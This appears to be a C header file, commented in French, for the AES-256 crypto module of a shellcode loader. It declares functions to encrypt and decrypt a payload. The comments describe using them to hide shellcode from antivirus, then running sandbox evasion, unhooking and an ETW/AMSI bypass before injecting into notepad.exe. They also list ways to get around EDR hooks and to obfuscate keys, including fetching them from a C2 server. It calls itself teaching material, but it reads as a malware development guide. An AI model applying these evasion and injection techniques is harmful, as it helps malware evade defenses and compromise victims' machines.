#ifndef CRYPTO_H
#define CRYPTO_H

#include <windows.h>
#include <wincrypt.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * ============================================================================
 * MODULE: CRYPTOGRAPHIE AES-256-CBC
 * ============================================================================
 * 
 * CONTEXTE PÉDAGOGIQUE:
 * ---------------------
 * Ce module implémente un système complet de chiffrement/déchiffrement pour
 * protéger le shellcode malveillant dans le binaire du loader.
 * 
 * POURQUOI CHIFFRER LE PAYLOAD?
 * ------------------------------
 * 1. **Évasion antivirus**: Les signatures AV détectent les shellcodes connus
 *    - Calc.exe shellcode = détecté instantanément
 *    - Shellcode chiffré = opaque pour l'analyse statique
 * 
 * 2. **Analyse statique**: Les analystes cherchent des patterns suspects
 *    - Opcodes x86/x64 reconnaissables (0x90 NOP, 0xCC INT3, etc.)
 *    - Strings suspectes ("cmd.exe", "CreateRemoteThread", etc.)
 *    - Le chiffrement masque tout cela
 * 
 * 3. **Protection du code**: Rend la rétro-ingénierie plus difficile
 *    - Impossible de voir le payload final sans exécution
 *    - Force l'analyste à faire de l'analyse dynamique (détectable)
 * 
 * WORKFLOW COMPLET:
 * -----------------
 *   [Phase 1: PRÉPARATION (offline)]
 *   Shellcode.bin → encrypt_payload.exe → encrypted_shellcode.bin + key + IV
 *                                               ↓
 *                                    Hardcodé dans loader.c
 * 
 *   [Phase 2: EXÉCUTION (runtime sur la cible)]
 *   Loader démarre → Evasion → Unhook → ETW/AMSI Bypass
 *                         ↓
 *                  DecryptPayload() ← encrypted_shellcode + key + IV
 *                         ↓
 *                  Shellcode en clair (en mémoire seulement!)
 *                         ↓
 *                  Process Injection → notepad.exe
 * 
 * ALGORITHME: AES-256-CBC
 * -----------------------
 * AES (Advanced Encryption Standard):
 *   - Chiffrement symétrique par blocs (même clé pour chiffrer/déchiffrer)
 *   - 256 bits = 32 bytes de clé (très sécurisé, non cassable en force brute)
 *   - Taille de bloc: 16 bytes (128 bits)
 * 
 * CBC (Cipher Block Chaining):
 *   - Mode de chaînage des blocs pour éviter les patterns
 *   - Nécessite un IV (Initialization Vector) de 16 bytes
 *   - Formule: C[i] = Encrypt(P[i] XOR C[i-1]), avec C[0] = IV
 * 
 * SCHÉMA CBC:
 *   Bloc 1:  Plaintext[0-15]  XOR  IV          → Encrypt → Ciphertext[0-15]
 *   Bloc 2:  Plaintext[16-31] XOR  Ciphertext[0-15] → Encrypt → Ciphertext[16-31]
 *   Bloc 3:  ...
 * 
 * Avantage CBC: Même plaintext répété produit des ciphertexts différents
 * 
 * PADDING PKCS#7:
 * ---------------
 * AES travaille par blocs de 16 bytes. Si les données ne sont pas multiples
 * de 16, on ajoute du padding:
 * 
 * Exemples:
 *   - Données: 13 bytes → Ajouter 3 bytes de valeur 0x03
 *   - Données: 16 bytes → Ajouter 16 bytes de valeur 0x10 (bloc complet)
 * 
 * Format: Si manque N bytes, ajouter N fois la valeur N
 *   Données: [AA BB CC] (3 bytes, manque 13)
 *   Paddé:   [AA BB CC 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D] (16 bytes)
 * 
 * CryptoAPI gère le padding automatiquement (ajout au chiffrement, retrait au déchiffrement)
 * 
 * GÉNÉRATION DES CLÉS ET IV:
 * --------------------------
 * 1. Clé AES-256 (32 bytes):
 *    - DOIT être aléatoire et cryptographiquement sécurisé
 *    - Utiliser CryptGenRandom() (pas rand() !)
 *    - Exemple: [3F A2 1B 9C ... ] (32 bytes hex)
 * 
 * 2. IV (16 bytes):
 *    - DOIT être unique pour chaque chiffrement avec la même clé
 *    - Peut être public (stocké avec le ciphertext)
 *    - Aussi généré avec CryptGenRandom()
 * 
 * ⚠️  ATTENTION: Réutiliser le même IV avec la même clé = VULNÉRABILITÉ
 * 
 * STOCKAGE DES SECRETS:
 * ---------------------
 * Dans un malware, on hardcode généralement:
 *   - Le ciphertext (shellcode chiffré) → Visible dans le binaire
 *   - La clé de déchiffrement → Obfusquée ou divisée
 *   - L'IV → Peut être en clair (pas critique)
 * 
 * Techniques d'obfuscation de la clé:
 *   1. XOR avec une constante
 *   2. Divisée en plusieurs morceaux
 *   3. Calculée dynamiquement (hash du nom de machine, etc.)
 *   4. Téléchargée depuis un C2 (Command & Control)
 * 
 * CRYPTOAPI WINDOWS:
 * ------------------
 * Microsoft fournit une API native pour la cryptographie:
 *   - CryptAcquireContext: Obtenir un provider crypto
 *   - CryptGenRandom: Générer des bytes aléatoires sécurisés
 *   - CryptCreateHash: Créer un hash (SHA-256)
 *   - CryptDeriveKey: Dériver une clé depuis un hash
 *   - CryptEncrypt/CryptDecrypt: Chiffrer/déchiffrer
 * 
 * Avantages:
 *   ✅ Intégré à Windows (pas de DLL externe)
 *   ✅ Accès au générateur aléatoire matériel (TPM)
 *   ✅ Certifié FIPS 140-2 (standards crypto)
 * 
 * Inconvénients:
 *   ❌ Peut être hookée par EDR (surveiller CryptDecrypt)
 *   ❌ Complexe à utiliser (beaucoup d'étapes)
 * 
 * SÉCURITÉ ET BONNES PRATIQUES:
 * ------------------------------
 * 1. ✅ Toujours valider les paramètres (NULL checks, taille > 0)
 * 2. ✅ Nettoyer la mémoire sensible (SecureZeroMemory sur les clés)
 * 3. ✅ Gérer les erreurs proprement (cleanup avec goto)
 * 4. ✅ Utiliser SHA-256 (pas SHA-1, déprécié)
 * 5. ✅ Vérifier les retours de toutes les APIs crypto
 * 6. ❌ NE JAMAIS hardcoder une clé en clair (obfusquer au minimum)
 * 7. ❌ NE JAMAIS logger les clés/IV en production
 * 
 * DÉTECTION PAR EDR:
 * ------------------
 * Les EDR surveillent:
 *   - Appels à CryptDecrypt (surtout avec AES-256)
 *   - Allocation mémoire RWX après déchiffrement
 *   - Patterns de shellcode après décryption (scan mémoire)
 *   - Comportement: decrypt → VirtualAlloc(RWX) → WriteProcessMemory
 * 
 * Cotournements:
 *   - Utiliser des syscalls pour l'allocation mémoire
 *   - Déchiffrer par petits morceaux
 *   - Stocker temporairement dans un fichier (cache system)
 *   - Implémenter AES manuellement (éviter CryptoAPI hookée)
 * 
 * ============================================================================n
 */

// Lier avec les bibliothèques crypto de Windows
#pragma comment(lib, "Advapi32.lib")  // Pour CryptAcquireContext, etc.
#pragma comment(lib, "Crypt32.lib")   // Pour certaines fonctions de hash

// Définir CALG_SHA_256 si non disponible (compatibilité MinGW/old headers)
#ifndef CALG_SHA_256
    #define CALG_SHA_256 (ALG_CLASS_HASH | ALG_TYPE_ANY | ALG_SID_SHA_256)
    #define ALG_SID_SHA_256 12
#endif

// Tailles des éléments crypto (en bytes)
#define AES_256_KEY_SIZE    32   // 256 bits = 32 bytes
#define AES_BLOCK_SIZE      16   // Taille de bloc AES = 128 bits = 16 bytes
#define AES_IV_SIZE         16   // IV = taille du bloc

// Macro de logging conditionnelle (désactiver en production pour stealth)
#ifdef DEBUG_CRYPTO
    #define CRYPTO_LOG(fmt, ...) printf("[CRYPTO] " fmt, ##__VA_ARGS__)
#else
    #define CRYPTO_LOG(fmt, ...) ((void)0)
#endif
/*
 * ============================================================================
 * FONCTION: EncryptPayload
 * ============================================================================
 * 
 * DESCRIPTION:
 * ------------
 * Chiffre un payload (shellcode) en utilisant AES-256-CBC.
 * Cette fonction est utilisée AVANT la compilation pour préparer le payload.
 * 
 * USAGE TYPIQUE:
 * --------------
 * Dans un outil séparé (encrypt_payload.exe):
 *   1. Lire shellcode.bin depuis le disque
 *   2. Générer clé + IV aléatoires
 *   3. Appeler EncryptPayload()
 *   4. Sauvegarder encrypted_shellcode.bin + key.txt + iv.txt
 * 
 * PARAMÈTRES:
 * -----------
 * @param plainData [IN]     - Buffer contenant les données en clair (shellcode)
 * @param dataSize [IN]      - Taille du buffer en clair (en bytes)
 * @param iv [IN]            - Vecteur d'initialisation (16 bytes, doit être aléatoire)
 * @param key [IN]           - Clé AES-256 (32 bytes, doit être aléatoire)
 * @param encryptedData [OUT] - Pointeur vers buffer chiffré (alloué par la fonction)
 * @param outSize [OUT]      - Taille réelle des données chiffrées (inclut padding)
 * 
 * RETOUR:
 * -------
 * @return BOOL - TRUE si chiffrement réussi, FALSE sinon
 * 
 * ALGORITHME DÉTAILLÉ:
 * --------------------
 * 1. Validation des paramètres (NULL checks, taille > 0)
 * 2. CryptAcquireContext() - Obtenir handle du provider AES
 * 3. CryptCreateHash(SHA-256) - Créer hash pour dériver la clé
 * 4. CryptHashData() - Hasher les 32 bytes de la clé
 * 5. CryptDeriveKey(AES-256) - Créer la clé de chiffrement
 * 6. CryptSetKeyParam(KP_MODE) - Configurer mode CBC
 * 7. CryptSetKeyParam(KP_IV) - Appliquer l'IV
 * 8. CryptEncrypt() - Chiffrer les données (ajoute padding PKCS#7)
 * 9. Cleanup des handles crypto
 * 
 * PADDING PKCS#7:
 * ---------------
 * CryptEncrypt ajoute automatiquement du padding pour atteindre un multiple
 * de 16 bytes (taille de bloc AES).
 * 
 * Exemple avec 13 bytes de données:
 *   Input:  [AA BB CC DD EE FF 00 11 22 33 44 55 66] (13 bytes)
 *   Padded: [AA BB CC DD EE FF 00 11 22 33 44 55 66 03 03 03] (16 bytes)
 *   
 * Le padding ajoute N fois la valeur N (ici 3 bytes de valeur 0x03).
 * 
 * ⚠️  IMPORTANT: La taille chiffrée peut être plus grande que l'original!
 * Calcul: outSize = ((dataSize / 16) + 1) * 16
 * 
 * GESTION MÉMOIRE:
 * ----------------
 * La fonction alloue dynamiquement le buffer de sortie.
 * L'appelant DOIT libérer avec free():
 * 
 * ```c
 * BYTE *encrypted = NULL;
 * DWORD encSize = 0;
 * if (EncryptPayload(shellcode, 276, iv, key, &encrypted, &encSize)) {
 *     // Utiliser encrypted...
 *     free(encrypted);  // ← OBLIGATOIRE
 * }
 * ```
 * 
 * CODES D'ERREUR:
 * ---------------
 * Utiliser GetLastError() après échec:
 *   - ERROR_INVALID_PARAMETER (87): Paramètres invalides
 *   - NTE_BAD_ALGID (0x80090008): Algorithme non supporté
 *   - NTE_BAD_KEY (0x80090003): Clé invalide ou corrompue
 * 
 * SÉCURITÉ:
 * ---------
 * ✅ La clé et l'IV doivent être générés avec GenerateRandomKey/IV
 * ✅ Ne JAMAIS réutiliser le même IV avec la même clé
 * ✅ Nettoyer la clé de la mémoire après usage (SecureZeroMemory)
 * ❌ Ne PAS logger la clé/IV en production
 */
BOOL EncryptPayload(
    BYTE *plainData, 
    SIZE_T dataSize, 
    BYTE iv[AES_IV_SIZE], 
    BYTE key[AES_256_KEY_SIZE], 
    BYTE **encryptedData, 
    DWORD *outSize
);

/*
 * ============================================================================
 * FONCTION: DecryptPayload
 * ============================================================================
 * 
 * DESCRIPTION:
 * ------------
 * Déchiffre un payload chiffré en AES-256-CBC.
 * Cette fonction est appelée AU RUNTIME dans le loader pour récupérer le shellcode.
 * 
 * USAGE TYPIQUE:
 * --------------
 * Dans loader.c (après sandbox evasion, unhooking, ETW/AMSI bypass):
 * 
 * ```c
 * // Payload chiffré hardcodé (généré par encrypt_payload.exe)
 * BYTE encryptedShellcode[] = { 0x3F, 0xA2, 0x1B, ... };
 * BYTE key[32] = { 0x12, 0x34, 0x56, ... };  // Obfusquée en prod
 * BYTE iv[16] = { 0xAB, 0xCD, 0xEF, ... };
 * 
 * BYTE *decrypted = NULL;
 * DWORD size = 0;
 * 
 * if (!DecryptPayload(encryptedShellcode, sizeof(encryptedShellcode), 
 *                     iv, key, &decrypted, &size)) {
 *     FatalError("Decryption failed");
 * }
 * 
 * // decrypted contient maintenant le shellcode en clair
 * // Prêt pour injection dans notepad.exe
 * ```
 * 
 * PARAMÈTRES:
 * -----------
 * @param encryptedData [IN]  - Buffer contenant les données chiffrées
 * @param dataSize [IN]       - Taille du buffer chiffré
 * @param iv [IN]             - Vecteur d'initialisation (même que lors du chiffrement)
 * @param key [IN]            - Clé AES-256 (même que lors du chiffrement)
 * @param decryptedData [OUT] - Pointeur vers buffer déchiffré (alloué par la fonction)
 * @param outSize [OUT]       - Taille réelle après déchiffrement (sans padding)
 * 
 * RETOUR:
 * -------
 * @return BOOL - TRUE si déchiffrement réussi, FALSE sinon
 * 
 * ALGORITHME DÉTAILLÉ:
 * --------------------
 * 1. Validation stricte des paramètres
 * 2. Allocation mémoire pour le buffer de sortie
 * 3. Copie des données chiffrées (CryptDecrypt modifie in-place)
 * 4. CryptAcquireContext() - Provider AES
 * 5. CryptCreateHash(SHA-256) - Hash pour la clé
 * 6. CryptHashData() - Hasher la clé
 * 7. CryptDeriveKey(AES-256) - Dériver la clé crypto
 * 8. CryptSetKeyParam(KP_MODE, CBC) - Mode CBC
 * 9. CryptSetKeyParam(KP_IV) - Appliquer l'IV (CRITIQUE!)
 * 10. CryptDecrypt() - Déchiffrer + retirer padding automatiquement
 * 11. Cleanup complet (même en cas d'erreur)
 * 
 * RETRAIT DU PADDING:
 * -------------------
 * CryptDecrypt retire automatiquement le padding PKCS#7.
 * La variable decryptedSize est mise à jour avec la taille réelle:
 * 
 * Exemple:
 *   Input:  [3F A2 1B ... 03 03 03] (288 bytes avec padding)
 *   Output: [48 31 C0 ... C3]       (285 bytes, shellcode original)
 * 
 * outSize contient 285 (taille utile), pas 288.
 * 
 * IMPORTANCE DE L'IV:
 * -------------------
 * ⚠️  L'IV DOIT être le même que lors du chiffrement!
 * 
 * Si IV différent:
 *   - Le premier bloc est corrompu (XOR avec mauvais IV)
 *   - Les blocs suivants peuvent être corrects (chaînage CBC)
 *   - Résultat: shellcode inutilisable
 * 
 * Schéma CBC déchiffrement:
 *   P[0] = Decrypt(C[0]) XOR IV
 *   P[1] = Decrypt(C[1]) XOR C[0]
 *   P[2] = Decrypt(C[2]) XOR C[1]
 * 
 * GESTION D'ERREURS:
 * ------------------
 * En cas d'échec:
 *   1. Le buffer *decryptedData est libéré automatiquement
 *   2. *decryptedData est mis à NULL
 *   3. Tous les handles crypto sont nettoyés (goto cleanup)
 *   4. FALSE est retourné
 * 
 * Utilisation sécurisée:
 * ```c
 * BYTE *payload = NULL;
 * DWORD size = 0;
 * 
 * if (!DecryptPayload(enc, encSize, iv, key, &payload, &size)) {
 *     printf("Error: %lu\n", GetLastError());
 *     return;
 * }
 * 
 * // payload est garanti non-NULL ici
 * ExecuteShellcode(payload, size);
 * 
 * free(payload);  // Nettoyer
 * ```
 * 
 * DÉTECTION PAR EDR:
 * ------------------
 * Les EDR surveillent particulièrement CryptDecrypt:
 *   - Hook sur l'API (voir unhooking.c pour contourner)
 *   - Scan mémoire après décryptage (recherche de shellcode patterns)
 *   - Corrélation: CryptDecrypt → VirtualAlloc(RWX) → CreateRemoteThread
 * 
 * Contournements possibles:
 *   - Utiliser unhooking avant décryptage (déjà fait dans notre loader)
 *   - Déchiffrer en plusieurs fois (complexe à détecter)
 *   - Implémenter AES manuellement (évite les hooks CryptoAPI)
 * 
 * NETTOYAGE MÉMOIRE:
 * ------------------
 * Après utilisation du shellcode déchiffré:
 * ```c
 * SecureZeroMemory(payload, size);  // Effacer de la RAM
 * free(payload);
 * ```
 * 
 * Ceci empêche la récupération du shellcode par dump mémoire forensique.
 */
BOOL DecryptPayload(
    BYTE *encryptedData, 
    SIZE_T dataSize, 
    BYTE iv[AES_IV_SIZE], 
    BYTE key[AES_256_KEY_SIZE], 
    BYTE **decryptedData, 
    DWORD *outSize
);

/*
 * ============================================================================
 * FONCTION: GenerateRandomKey
 * ============================================================================
 * 
 * DESCRIPTION:
 * ------------
 * Génère une clé AES-256 cryptographiquement sécurisée (32 bytes aléatoires).
 * Utilise le générateur CSPRNG (Cryptographically Secure Pseudo-Random Number Generator)
 * de Windows via CryptGenRandom().
 * 
 * POURQUOI PAS rand()?
 * --------------------
 * ❌ rand() de la libc:
 *    - Générateur pseudo-aléatoire déterministe
 *    - Prévisible si on connaît le seed (time())
 *    - Pattern détectable statistiquement
 *    - PAS cryptographiquement sécurisé
 * 
 * ✅ CryptGenRandom():
 *    - Utilise des sources d'entropie matérielles (TPM, bruit CPU, etc.)
 *    - Non déterministe et non prévisible
 *    - Certifié FIPS 140-2 pour la cryptographie
 *    - Standard pour générer clés/IV
 * 
 * PARAMÈTRES:
 * -----------
 * @param key [OUT] - Buffer de 32 bytes qui recevra la clé aléatoire
 * 
 * RETOUR:
 * -------
 * @return BOOL - TRUE si génération réussie, FALSE sinon
 * 
 * UTILISATION:
 * ------------
 * ```c
 * BYTE key[32];
 * if (!GenerateRandomKey(key)) {
 *     printf("Failed to generate key: %lu\n", GetLastError());
 *     return;
 * }
 * 
 * // key contient maintenant 32 bytes aléatoires sécurisés
 * // Exemple: [3F A2 1B 9C D4 7E 8F 12 ...]
 * ```
 * 
 * SÉCURITÉ:
 * ---------
 * ⚠️  Toujours vérifier le retour de cette fonction
 * ⚠️  Nettoyer la clé après usage (SecureZeroMemory)
 * ⚠️  Ne JAMAIS logger la clé générée
 */
BOOL GenerateRandomKey(BYTE key[AES_256_KEY_SIZE]);

/*
 * ============================================================================
 * FONCTION: GenerateRandomIV
 * ============================================================================
 * 
 * DESCRIPTION:
 * ------------
 * Génère un vecteur d'initialisation (IV) aléatoire de 16 bytes pour AES-CBC.
 * Utilise également CryptGenRandom() pour garantir l'imprévisibilité.
 * 
 * IMPORTANCE DE L'IV:
 * -------------------
 * En mode CBC, l'IV est essentiel pour:
 *   1. Garantir que le même plaintext produit des ciphertexts différents
 *   2. Empêcher les attaques par pattern (reconnaissance de blocs identiques)
 *   3. Ajouter de l'aléa au premier bloc chiffré
 * 
 * RÈGLES DE L'IV:
 * ---------------
 * ✅ Doit être unique pour chaque chiffrement avec la même clé
 * ✅ Doit être imprévisible (aléatoire)
 * ✅ Peut être stocké en clair (pas secret, contrairement à la clé)
 * ❌ Ne JAMAIS réutiliser le même IV avec la même clé (vulnérabilité!)
 * 
 * EXEMPLE D'ATTAQUE SI IV RÉUTILISÉ:
 * ----------------------------------
 * Chiffrement 1: C1 = Encrypt(P1 XOR IV)
 * Chiffrement 2: C2 = Encrypt(P2 XOR IV)  ← Même IV!
 * 
 * L'attaquant peut calculer: C1 XOR C2 = Encrypt(P1 XOR IV) XOR Encrypt(P2 XOR IV)
 * Ce qui peut révéler des informations sur P1 et P2.
 * 
 * PARAMÈTRES:
 * -----------
 * @param iv [OUT] - Buffer de 16 bytes qui recevra l'IV aléatoire
 * 
 * RETOUR:
 * -------
 * @return BOOL - TRUE si génération réussie, FALSE sinon
 * 
 * UTILISATION:
 * ------------
 * ```c
 * BYTE iv[16];
 * if (!GenerateRandomIV(iv)) {
 *     printf("Failed to generate IV: %lu\n", GetLastError());
 *     return;
 * }
 * 
 * // iv contient maintenant 16 bytes aléatoires
 * // Exemple: [AB CD EF 01 23 45 67 89 ...]
 * ```
 */
BOOL GenerateRandomIV(BYTE iv[AES_IV_SIZE]);

/*
 * ============================================================================
 * FONCTION: PrintHex
 * ============================================================================
 * 
 * DESCRIPTION:
 * ------------
 * Affiche un buffer binaire en format hexadécimal lisible.
 * Utile pour debug et logging pendant le développement.
 * 
 * FORMAT DE SORTIE:
 * -----------------
 * [Label] 3F A2 1B 9C D4 7E 8F 12 ...
 * 
 * Exemple:
 *   PrintHex("Key", key, 32);
 *   Output: [Key] 3F A2 1B 9C D4 7E 8F 12 ... (32 bytes)
 * 
 * PARAMÈTRES:
 * -----------
 * @param label [IN] - Libellé descriptif (ex: "Key", "IV", "Shellcode")
 * @param data [IN]  - Buffer binaire à afficher
 * @param size [IN]  - Taille du buffer en bytes
 * 
 * ⚠️  ATTENTION EN PRODUCTION:
 * ----------------------------
 * Cette fonction révèle des données sensibles dans la console/logs.
 * À utiliser UNIQUEMENT en phase de développement.
 * 
 * En production:
 *   - Désactiver avec #ifdef DEBUG_CRYPTO
 *   - Ou supprimer complètement les appels
 */
void PrintHex(const char *label, BYTE *data, SIZE_T size);

/*
 * ============================================================================
 * FONCTION: HexStringToBytes
 * ============================================================================
 * 
 * DESCRIPTION:
 * ------------
 * Convertit une chaîne hexadécimale en buffer binaire.
 * Utile pour hardcoder des données chiffrées depuis un fichier texte.
 * 
 * FORMAT D'ENTRÉE ACCEPTÉ:
 * ------------------------
 * - Avec espaces: "3F A2 1B 9C"
 * - Sans espaces: "3FA21B9C"
 * - Avec 0x:      "0x3F 0xA2 0x1B 0x9C"
 * 
 * EXEMPLE D'USAGE:
 * ----------------
 * ```c
 * const char *hexKey = "3FA21B9CD47E8F12AB34CD56EF78901234567890ABCDEF12";
 * BYTE *keyBytes = NULL;
 * SIZE_T keySize = 0;
 * 
 * if (HexStringToBytes(hexKey, &keyBytes, &keySize)) {
 *     printf("Converted %zu bytes\n", keySize);
 *     // Utiliser keyBytes...
 *     free(keyBytes);
 * }
 * ```
 * 
 * PARAMÈTRES:
 * -----------
 * @param hexStr [IN]     - Chaîne hex (ex: "3FA21B9C")
 * @param outBytes [OUT]  - Buffer binaire alloué (à free() par l'appelant)
 * @param outSize [OUT]   - Taille du buffer en bytes
 * 
 * RETOUR:
 * -------
 * @return BOOL - TRUE si conversion réussie, FALSE si format invalide
 * 
 * VALIDATION:
 * -----------
 * La fonction vérifie:
 *   - Longueur paire (2 chars hex = 1 byte)
 *   - Caractères valides (0-9, A-F, a-f)
 *   - Allocation mémoire réussie
 */
BOOL HexStringToBytes(const char *hexStr, BYTE **outBytes, SIZE_T *outSize);

#endif // CRYPTO_H
